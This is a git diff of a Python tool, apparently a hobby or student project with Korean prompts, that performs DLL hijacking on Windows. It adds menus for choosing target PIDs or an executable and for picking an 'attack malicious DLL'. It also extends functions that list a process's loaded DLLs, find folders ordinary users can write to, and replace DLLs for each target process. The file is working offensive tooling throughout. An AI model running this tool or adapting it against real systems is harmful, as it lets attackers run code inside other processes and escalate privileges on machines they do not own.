@@ -8,6 +8,25 @@ class hiJacking():
     def hiJacking(self):
         pass
     def __init__(self):
+        print("\n\nExecute DLL HiJacking mode------------------------------------------")
+        input_op = input("\n입력할 옵션을 선택하시오.\n1. PID 입력하기    2. exe 경로 입력하기\n번호 입력:")
+        print("\n")
+        
+        if input_op == '1':
+            self.U_PID()
+        elif input_op == '2':
+            self.U_exe()
+        else:
+            print('ERROR::Wrong number..')
+            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+            print('\n')
+            if ans == 'y':
+                self.__init__()
+            else: 
+                print("\n\n--End the program--\n")
+                return
+    
+    def U_PID(self):
         del_pidlist = [0, 4, 120, 540, 748, 848, 860, 908, 916, 948,
                        988, 1196, 1256, 1420, 1424, 1436, 1456, 1468, 1548, 1628,
                        1740, 1748, 1812, 1820, 1828, 1924, 2000, 2072, 2096, 2172,
@@ -18,7 +37,7 @@ class hiJacking():
                        8344, 8484, 8620, 8724, 8744, 8852, 9272, 9312, 9612, 9820,
                        10228, 10236, 10408, 11228, 11540, 11852, 13152, 13712, 14300, 15280,
                        16536, 17396]
-        
+        print('<안내 - PID를 입력해주세요>')
         pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
         pid_arr = pid_in.split(' ')
         self.pid = []
@@ -28,11 +47,41 @@ class hiJacking():
             
         elif pid_arr[0] == 'm':
             pid_arr.pop(0)
-            
+            print('<안내 - 2개 이상의 PID를 입력받았습니다.>')
+            print('<안내 - Windows의 기본 프로세스 PID를 필터링합니다.>')
             for i in pid_arr:
                 if int(i) in del_pidlist:
                     print(f'\nWARNING::You cannot attack PID \'{i}\'.')
                     pid_arr.remove(i)
+                    
+            self.pid= pid_arr
+                
+                                
+        else: 
+            print('\nERROR::Wrong command..')
+            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+            print('\n')
+            if ans == 'y':
+                self.__init__()
+            else: 
+                print("\n\n--End the program--\n")
+                return 
+                    
+        
+        print("\nAttackable PID:", * self.pid)
+        self.attack()
+    
+    
+    def U_exe(self):
+        pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
+        pid_arr = pid_in.split(' ')
+        self.pid = []
+        if pid_arr[0] == 'o':
+            pid_arr.pop(0)
+            self.pid.append(pid_arr[1])
+            
+        elif pid_arr[0] == 'm':
+            pid_arr.pop(0)
                     
             self.pid= pid_arr
                 
@@ -46,10 +95,30 @@ class hiJacking():
             else: 
                 print("\n\n--End the program--\n")
                 return 
-                    
-        
-        print("\nAttackable PID:", * self.pid)
     
+        self.attack()
+    
+    def U_dll(self):
+        print("<안내 - 공격용 악성 dll 옵션을 입력해주세요>")
+        dll_in = input('옵션을 선택해주세요.\n1. 직접 dll 입력하기\t2. 제공되는 dll 사용하기\n입력할 명령어:')
+        if dll_in == '1':
+            user_dll=input('사용하실 dll의 경로를 입력해주세요.\n입력할 경로:')
+            
+        elif dll_in == '2':
+            user_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
+               
+        else: 
+            print('\nERROR::Wrong number..')
+            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+            if ans == 'y':
+                self.U_dll()
+            else: 
+                print("\n\n--End the program--\n")
+                return
+
+        return user_dll
+        
+        
     #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
     def list_dll(self):
         stream = os.popen("Listdlls.exe " + str(self.pid))
@@ -85,7 +154,8 @@ class hiJacking():
                 list_dlls.append(i)
         return program_name, list_dlls
         
-        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
+    
+    #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
     def check_permission(self,path):
         user_perm_dir = []
         user_perm_file = []
@@ -106,6 +176,7 @@ class hiJacking():
             except:
                 pass
         return user_perm_file,user_perm_dir
+    
     #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
     def find_string(self,name,list_name,list_dir):
         stream = os.popen("strings " + name)
@@ -122,6 +193,7 @@ class hiJacking():
                 return True
             else:
                 return False
+            
     #exe파일을 직접 실행하여 pid를 가져옴
     def create_process(self,path):
             return subprocess.Popen([path]).pid
@@ -135,12 +207,15 @@ class hiJacking():
                 
         except:
             print("\nERROR::Cannot remove or write DLL")
+            
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
     def attack(self):
-        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
-        path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
+        # path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
+        # path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
         # pid = self.create_process(path_exe)
+        path_dll = self.U_dll()
+        
         for i in range(0,len(self.pid)):
             print(f'{len(self.pid)}개의 pid 중 {i}번째 pid로의 hiJacking!')
             
@@ -209,8 +284,9 @@ def cho_mod():
     if (att_mod != 'DI') & (att_mod != 'DH'):
         print("\nERROR::Attack mode is wrong ..")
         ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+        print('\n')
         if ans == 'y':
-             cho_mod()
+            return cho_mod()
         else: 
             print("\n\n--End the program--\n")
             return 'q'
@@ -218,6 +294,20 @@ def cho_mod():
     return att_mod
             
 if __name__=='__main__': 
+    
+    print(" /$$$$$$$ ")
+    print("| $$__  $$  ")
+    print("| $$  \ $$ /$$   /$$ /$$$$$$$   /$$$$$$   /$$$$$$$")
+    print("| $$  | $$| $$  | $$| $$__  $$ /$$__  $$ /$$_____/")
+    print("| $$  | $$| $$  | $$| $$  \ $$| $$  \ $$|  $$$$$$ ")
+    print("| $$  | $$| $$  | $$| $$  | $$| $$  | $$ \____  $$")
+    print("| $$$$$$$/|  $$$$$$$| $$  | $$|  $$$$$$/ /$$$$$$$/")
+    print("|_______/  \____  $$|__/  |__/ \______/ |_______/ ")
+    print("           /$$  | $$ ")
+    print("          |  $$$$$$/")
+    print("           \______/")
+    print("\n")    
+    
     mode = cho_mod()
     
     if mode == 'DI':
